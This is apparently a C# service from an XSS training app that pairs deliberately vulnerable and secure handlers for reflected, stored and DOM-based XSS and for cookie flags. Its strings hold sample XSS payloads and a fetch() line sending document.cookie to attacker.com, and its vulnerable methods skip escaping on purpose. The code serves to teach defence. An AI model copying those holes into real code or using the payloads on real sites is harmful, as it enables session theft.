namespace TechFix.Infrastructure.Services;

using System.Text.Encodings.Web;
using System.Text.RegularExpressions;
using TechFix.Application.DTOs;
using TechFix.Application.Interfaces;

public class XssService : IXssService
{
    private static readonly List<CommentXssItemDto> _storedCommentsVulnerable = new()
    {
        new CommentXssItemDto
        {
            Id = 1,
            Author = "TechGuy",
            RawContent = "Чудовий сервіс з ремонту ноутбуків! Рекомендую всім.",
            SafeHtmlContent = "Чудовий сервіс з ремонту ноутбуків! Рекомендую всім.",
            CreatedAt = DateTime.UtcNow.AddHours(-2)
        }
    };

    private static readonly List<CommentXssItemDto> _storedCommentsSecure = new()
    {
        new CommentXssItemDto
        {
            Id = 1,
            Author = "TechGuy",
            RawContent = "Чудовий сервіс з ремонту ноутбуків! Рекомендую всім.",
            SafeHtmlContent = "Чудовий сервіс з ремонту ноутбуків! Рекомендую всім.",
            CreatedAt = DateTime.UtcNow.AddHours(-2)
        }
    };

    private static readonly object _syncRoot = new();

    public ReflectedXssResultDto ProcessReflectedSearchVulnerable(string query)
    {
        // Vulnerable: raw injection into HTML response without escaping
        var rendered = $"<div class='search-results'><h3>Результати пошуку для:</h3><span id='query-echo'>{query}</span></div>";
        return new ReflectedXssResultDto
        {
            Query = query,
            RenderedOutput = rendered,
            IsSanitized = false,
            Context = "Reflected directly into DOM span without HTML encoding",
            Warning = "VULNERABLE (CWE-79): Any script tags or event handlers like <script>alert('XSS')</script> or <img src=x onerror=alert(1)> will execute in victim's browser."
        };
    }

    public ReflectedXssResultDto ProcessReflectedSearchSecure(string query)
    {
        // Secure: context-aware HTML encoding
        var encodedQuery = HtmlEncoder.Default.Encode(query ?? string.Empty);
        var rendered = $"<div class='search-results'><h3>Результати пошуку для:</h3><span id='query-echo'>{encodedQuery}</span></div>";
        return new ReflectedXssResultDto
        {
            Query = query ?? string.Empty,
            RenderedOutput = rendered,
            IsSanitized = true,
            Context = "Strict System.Text.Encodings.Web.HtmlEncoder.Default applied",
            Warning = "SECURED: Special characters (<, >, \", ', &) safely converted to HTML entities (&lt;, &gt;, &#39;), preventing script execution."
        };
    }

    public Task<CommentXssItemDto> AddCommentVulnerableAsync(CommentXssRequestDto request)
    {
        lock (_syncRoot)
        {
            var item = new CommentXssItemDto
            {
                Id = _storedCommentsVulnerable.Count + 1,
                Author = request.Author,
                RawContent = request.Content,
                SafeHtmlContent = request.Content, // Vulnerable: stored verbatim without sanitization
                CreatedAt = DateTime.UtcNow
            };
            _storedCommentsVulnerable.Add(item);
            return Task.FromResult(item);
        }
    }

    public Task<IReadOnlyList<CommentXssItemDto>> GetCommentsVulnerableAsync()
    {
        lock (_syncRoot)
        {
            return Task.FromResult<IReadOnlyList<CommentXssItemDto>>(_storedCommentsVulnerable.ToList());
        }
    }

    public Task<CommentXssItemDto> AddCommentSecureAsync(CommentXssRequestDto request)
    {
        lock (_syncRoot)
        {
            // Secure: Strip dangerous attributes, encode HTML content before storing/rendering
            var cleanAuthor = HtmlEncoder.Default.Encode(request.Author ?? "Anonymous");
            var rawContent = request.Content ?? string.Empty;
            
            // Defang scripts and javascript handlers
            var sanitized = Regex.Replace(rawContent, @"<script[^>]*>.*?</script>", "", RegexOptions.IgnoreCase | RegexOptions.Singleline);
            sanitized = Regex.Replace(sanitized, @"javascript\s*:", "blocked-scheme:", RegexOptions.IgnoreCase);
            sanitized = Regex.Replace(sanitized, @"on\w+\s*=", "blocked-handler=", RegexOptions.IgnoreCase);
            var safeHtml = HtmlEncoder.Default.Encode(sanitized);

            var item = new CommentXssItemDto
            {
                Id = _storedCommentsSecure.Count + 1,
                Author = cleanAuthor,
                RawContent = rawContent,
                SafeHtmlContent = safeHtml,
                CreatedAt = DateTime.UtcNow
            };
            _storedCommentsSecure.Add(item);
            return Task.FromResult(item);
        }
    }

    public Task<IReadOnlyList<CommentXssItemDto>> GetCommentsSecureAsync()
    {
        lock (_syncRoot)
        {
            return Task.FromResult<IReadOnlyList<CommentXssItemDto>>(_storedCommentsSecure.ToList());
        }
    }

    public DomXssResultDto EvaluateDomXssVulnerable(string redirectUrl)
    {
        var isDangerous = redirectUrl.TrimStart().StartsWith("javascript:", StringComparison.OrdinalIgnoreCase) ||
                          redirectUrl.Contains("<script>", StringComparison.OrdinalIgnoreCase);

        var clientCode = $"// Unsafe DOM Sink:\nconst url = '{redirectUrl}';\nwindow.location.href = url;\n// or document.getElementById('link').innerHTML = '<a href=\"' + url + '\">Click</a>';";

        return new DomXssResultDto
        {
            ParameterValue = redirectUrl,
            ClientSinkCode = clientCode,
            IsVulnerableToDomSink = isDangerous,
            Explanation = isDangerous 
                ? "VULNERABLE (CWE-79): Untrusted user input is passed directly to an execution sink (window.location.href / innerHTML). Exploitation via 'javascript:alert(document.domain)' executes arbitrary code."
                : "Input does not immediately trigger known script prefix, but sink remains insecure.",
            RemediationAdvice = "Never assign untrusted input to dangerous sinks. Validate URL scheme against whitelist (http/https only) and use textContent or URL constructor."
        };
    }

    public DomXssResultDto EvaluateDomXssSecure(string redirectUrl)
    {
        bool isValid = Uri.TryCreate(redirectUrl, UriKind.RelativeOrAbsolute, out var uri) &&
                       (uri.IsAbsoluteUri ? (uri.Scheme == Uri.UriSchemeHttp || uri.Scheme == Uri.UriSchemeHttps) : redirectUrl.StartsWith("/"));

        var sanitizedUrl = isValid ? redirectUrl : "/";
        var clientCode = $"// Safe DOM Implementation:\nconst rawUrl = '{sanitizedUrl}';\nif (rawUrl.startsWith('/') || rawUrl.startsWith('https://')) {{\n    window.location.assign(rawUrl);\n}} else {{\n    console.warn('Blocked untrusted redirect attempt');\n}}";

        return new DomXssResultDto
        {
            ParameterValue = redirectUrl,
            ClientSinkCode = clientCode,
            IsVulnerableToDomSink = false,
            Explanation = isValid 
                ? "SECURED: Input URL has been validated against strict scheme whitelist (http/https or relative paths). Dangerous pseudo-protocols ('javascript:', 'data:') are rejected."
                : "SECURED: Dangerous or malformed URL was rejected and sanitized to safe fallback root path '/'.",
            RemediationAdvice = "Adopt Content Security Policy (CSP) with 'script-src self' and sanitize all client-side navigations using URL parsing API."
        };
    }

    public CookieSecurityAuditDto AuditCookieProtectionVulnerable()
    {
        return new CookieSecurityAuditDto
        {
            CookieName = "TechFix_AuthSession",
            HttpOnly = false,
            Secure = false,
            SameSite = "None",
            CanBeStolenViaDocumentCookie = true,
            StatusDescription = "VULNERABLE (CWE-1004): Cookie lacks HttpOnly flag. An attacker executing an XSS payload can execute 'fetch(\"https://attacker.com/steal?cookie=\" + encodeURIComponent(document.cookie))' to hijack the user session."
        };
    }

    public CookieSecurityAuditDto AuditCookieProtectionSecure()
    {
        return new CookieSecurityAuditDto
        {
            CookieName = "TechFix_AuthSession",
            HttpOnly = true,
            Secure = true,
            SameSite = "Strict",
            CanBeStolenViaDocumentCookie = false,
            StatusDescription = "SECURED: Cookie configured with HttpOnly=true, Secure=true, SameSite=Strict. JavaScript DOM access (document.cookie) is blocked by browser engine, preventing cookie theft even in case of XSS."
        };
    }
}
